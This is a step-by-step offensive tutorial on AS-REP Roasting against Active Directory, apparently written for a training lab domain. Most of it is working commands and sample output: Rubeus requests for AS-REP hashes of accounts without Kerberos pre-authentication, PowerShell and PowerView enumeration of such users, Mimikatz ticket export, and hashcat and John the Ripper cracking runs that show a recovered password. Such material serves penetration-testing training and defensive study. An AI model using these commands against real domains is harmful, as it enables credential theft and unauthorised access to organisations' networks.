AS-REP Roasting targets user accounts with Kerberos pre-authentication disabled. When this setting is enabled, we can request an authentication ticket (AS-REQ) for any user without knowing their password, and the Domain Controller will respond with a ticket encrypted with the user's password hash that can be cracked offline.

## Using Rubeus

### 1. Basic AS-REP Roasting for a Single User

```powershell
.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt
```

**Expected Output:**
```
   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[*] Action: AS-REP roasting

[*] Target User            : jenna.smith
[*] Target Domain          : inlanefreight.local
[*] Target DC              : dc01.inlanefreight.local

[*] Using domain controller: dc01.inlanefreight.local (fe80::c872:c68d:a355:e6f3%11)
[*] Building AS-REQ (w/o preauth) for: 'inlanefreight.local\jenna.smith'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jenna.smith@inlanefreight.local:9369076320<SNIP>

[*] Hash written to hashes.txt
```

**Parameter Breakdown:**
- `/user:jenna.smith` - Target specific user account
- `/domain:inlanefreight.local` - Target domain
- `/dc:dc01.inlanefreight.local` - Domain Controller to query
- `/nowrap` - Output hash on a single line (easier for cracking)
- `/outfile:hashes.txt` - Save hash to file

### 2. AS-REP Roasting Against All Users

```powershell
.\Rubeus.exe asreproast /format:hashcat /nowrap /outfile:asrep_hashes.txt
```

**Expected Output:**
```
[*] Action: AS-REP roasting

[*] Target Domain          : INLANEFREIGHT.LOCAL

[*] Searching path 'LDAP://INLANEFREIGHT.LOCAL/DC=INLANEFREIGHT,DC=LOCAL' for '(userAccountControl:1.2.840.113556.1.4.803:=4194304)'
[*] Domain Users:
[*]   Found user with preauth disabled: jenna.smith
[*]   Found user with preauth disabled: svc-alfresco
[*]   Found user with preauth disabled: backupadmin

[*] Using domain controller: dc01.inlanefreight.local (fe80::c872:c68d:a355:e6f3%11)
[*] Building AS-REQ (w/o preauth) for: 'inlanefreight.local\jenna.smith'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$jenna.smith@inlanefreight.local:9369076320<SNIP>

[*] Building AS-REQ (w/o preauth) for: 'inlanefreight.local\svc-alfresco'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$svc-alfresco@inlanefreight.local:4e9482d5bf0f73ac9fa1503bb9efc7a7<SNIP>
```

### 3. Using Different Hash Formats

**For Hashcat:**
```powershell
.\Rubeus.exe asreproast /format:hashcat /nowrap
```

**For John the Ripper:**
```powershell
.\Rubeus.exe asreproast /format:john /nowrap
```

### 4. AS-REP Roasting with Credentials

If you have valid credentials but want to target specific users:

```powershell
.\Rubeus.exe asreproast /creduser:INLANEFREIGHT\forend /credpassword:Password123! /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap
```

## Using PowerShell (Manual Method)

### 5. Find Users with Pre-Authentication Disabled

First, identify users vulnerable to AS-REP roasting:

```powershell
# Import Active Directory module if available
Import-Module ActiveDirectory

# Find users with pre-authentication disabled
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $true} -Properties DoesNotRequirePreAuth,userPrincipalName | select Name,userPrincipalName
```

**Expected Output:**
```
Name         userPrincipalName
----         -----------------
jenna.smith  jenna.smith@inlanefreight.local
svc-alfresco svc-alfresco@inlanefreight.local
backupadmin  backupadmin@inlanefreight.local
```

### 6. Manual AS-REQ Request with PowerShell (Alternative)

If Rubeus is not available, you can use .NET classes:

```powershell
# Load the required assembly
Add-Type -AssemblyName System.IdentityModel

# Request TGT for user with pre-authentication disabled
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "jenna.smith@INLANEFREIGHT.LOCAL"
```

Then use Mimikatz to extract the ticket:
```cmd
mimikatz # kerberos::list /export
```

## Cracking AS-REP Hashes

### 7. Transfer Hashes to Linux Attack Host

Copy the hash from `hashes.txt` to your Linux attack machine:

```bash
cat hashes.txt
$krb5asrep$jenna.smith@inlanefreight.local:9369076320...<SNIP>
```

### 8. Crack with Hashcat

```bash
# Basic cracking
sudo hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt

# With rules for better results
sudo hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

**Hashcat Mode Reference:**
- `18200` - Kerberos 5 AS-REP etype 23 (RC4)
- `19600` - Kerberos 5 AS-REP etype 17 (AES128)
- `19700` - Kerberos 5 AS-REP etype 18 (AES256)

### 9. Crack with John the Ripper

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

**Expected Output:**
```
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Thestrokes23     ($krb5asrep$jenna.smith@inlanefreight.local)
```
## Using PowerView

### 10. Enumerate AS-REP Roastable Users with PowerView

```powershell
# Import PowerView
Import-Module .\PowerView.ps1

# Find users with pre-authentication disabled
Get-DomainUser -PreauthNotRequired -Properties samaccountname,userprincipalname
```

**Expected Output:**
```
samaccountname userprincipalname
-------------- -----------------
jenna.smith    jenna.smith@inlanefreight.local
svc-alfresco   svc-alfresco@inlanefreight.local
backupadmin    backupadmin@inlanefreight.local
```